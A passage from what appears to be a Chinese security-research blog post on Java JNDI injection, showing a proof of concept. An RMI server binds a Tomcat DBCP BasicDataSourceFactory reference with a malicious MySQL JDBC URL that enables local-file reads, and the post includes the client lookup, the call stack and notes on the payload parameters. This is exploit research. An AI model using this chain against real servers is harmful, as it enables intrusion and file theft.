</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Reference</span><span class="w"> </span><span class="n">ref</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Reference</span><span class="p">(</span><span class="s">&#34;javax.sql.DataSource&#34;</span><span class="p">,</span><span class="s">&#34;org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ref</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">StringRefAddr</span><span class="p">(</span><span class="s">&#34;url&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;jdbc:mysql://127.0.0.1:3307/test?allowLoadLocalInfile=YES&amp;allowUrlInLocalInfile=true&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ref</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">StringRefAddr</span><span class="p">(</span><span class="s">&#34;initialSize&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;2&#34;</span><span class="p">));</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ReferenceWrapper</span><span class="w"> </span><span class="n">referenceWrapper</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ReferenceWrapper</span><span class="p">(</span><span class="n">ref</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ctx</span><span class="p">.</span><span class="na">bind</span><span class="p">(</span><span class="s">&#34;Jie&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">referenceWrapper</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>client</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">jndi</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.naming.InitialContext</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">JNDIDemo</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">InitialContext</span><span class="w"> </span><span class="n">ctx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">InitialContext</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ctx</span><span class="p">.</span><span class="na">lookup</span><span class="p">(</span><span class="s">&#34;rmi://127.0.0.1:1099/Jie&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>然后在<code>BasicDataSourceFactory#getObjectInstance</code>中，一直调用会调到<code>connect()</code>且url是可控的，及可以利用<code>JDBC</code>，调用栈放下面了（不想每个截图占地方了）</p>
<p><img loading="lazy" src="images/image-20250225104359144.png" alt="image-20250225104359144"  />
</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">createConnection:55, DriverConnectionFactory (org.apache.tomcat.dbcp.dbcp2)
</span></span><span class="line"><span class="cl">makeObject:355, PoolableConnectionFactory (org.apache.tomcat.dbcp.dbcp2)
</span></span><span class="line"><span class="cl">validateConnectionFactory:114, BasicDataSource (org.apache.tomcat.dbcp.dbcp2)
</span></span><span class="line"><span class="cl">createPoolableConnectionFactory:664, BasicDataSource (org.apache.tomcat.dbcp.dbcp2)
</span></span><span class="line"><span class="cl">createDataSource:543, BasicDataSource (org.apache.tomcat.dbcp.dbcp2)
</span></span><span class="line"><span class="cl">getLogWriter:1076, BasicDataSource (org.apache.tomcat.dbcp.dbcp2)
</span></span><span class="line"><span class="cl">createDataSource:561, BasicDataSourceFactory (org.apache.tomcat.dbcp.dbcp2)
</span></span><span class="line"><span class="cl">getObjectInstance:238, BasicDataSourceFactory (org.apache.tomcat.dbcp.dbcp2)
</span></span></code></pre></div><p>然后简单说说poc的构造吧，就是<code>那几个参数</code></p>
<p><code>BasicDataSourceFactory#getObjectInstance</code>中,会对<code>ClassName</code>进行判断，所以设置这个值</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="s">&#34;javax.sql.DataSource&#34;</span><span class="p">.</span><span class="na">equals</span><span class="p">(</span><span class="n">ref</span><span class="p">.</span><span class="na">getClassName</span><span class="p">()))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p><img loading="lazy" src="images/image-20250225104959405.png" alt="image-20250225104959405"  />
</p>
<p>上面这里会对我们的<code>Reference.addrs</code>中<code>元素</code>进行获取并存到这个<code>properties</code>进行后面<code>createDataSource()</code>的赋值</p>
<p>这里有两个是<code>关键值</code>要赋予，一个是<code>url</code>，另一个是<code>initialSize</code></p>
<p><img loading="lazy" src="images/image-20250225105445743.png" alt="image-20250225105445743"  />
</p>
<p><img loading="lazy" src="images/image-20250225105419323.png" alt="image-20250225105419323"  />
</p>
<p>因为下面有个<code>if</code>我们要进入，所以设置<code>initialSize&gt;0</code>即可</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">dataSource</span><span class="p">.</span><span class="na">getInitialSize</span><span class="p">()</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">dataSource</span><span class="p">.</span><span class="na">getLogWriter</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><p>而最后调用的<code>this.connectionString</code>的值，正是来自<code>BasicDataSource</code>的<code>this.url</code>，也就是上图<code>dataSource.setUrl(value);</code>这个地方设置的值</p>
<p><img loading="lazy" src="images/image-20250225105824327.png" alt="image-20250225105824327"  />
</p>
<p>调用成功！</p>
<p><img loading="lazy" src="images/image-20250225110707544.png" alt="image-20250225110707544"  />
</p>
<h1 id="参考"><strong>参考</strong><a hidden class="anchor" aria-hidden="true" href="#参考">#</a></h1>
<blockquote>
<p>h2</p>
<p><a href="https://xz.aliyun.com/news/15960">https://xz.aliyun.com/news/15960</a></p>
<p><a href="https://xz.aliyun.com/news/13371">https://xz.aliyun.com/news/13371</a></p>
<p><a href="https://unam4.github.io/2024/11/12/h2%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9C%A8jdk17%E4%B8%8B%E7%9A%84rce%E6%8E%A2%E7%B4%A2/#%E5%88%86%E6%9E%90">https://unam4.github.io/2024/11/12/h2%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9C%A8jdk17%E4%B8%8B%E7%9A%84rce%E6%8E%A2%E7%B4%A2/#%E5%88%86%E6%9E%90</a></p>
<p>mysql</p>
<p><a href="https://xz.aliyun.com/news/7754">https://xz.aliyun.com/news/7754</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1818089">https://cloud.tencent.com/developer/article/1818089</a></p>
</blockquote>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://Jiecub3.github.io/zh/posts/java/fastjson/fastjson%E5%8E%9F%E7%94%9F%E9%93%BE/">
    <span class="title">« 上一页</span>
    <br>
    <span>Fastjson原生链</span>
  </a>
  <a class="next" href="https://Jiecub3.github.io/zh/posts/java/jndi/">
    <span class="title">下一页 »</span>
    <br>
    <span>JNDI</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://Jiecub3.github.io/zh/">Jiecub3</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = '复制';

        function copyingDone() {
            copybutton.innerHTML = '已复制！';
            setTimeout(() => {
                copybutton.innerHTML = '复制';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
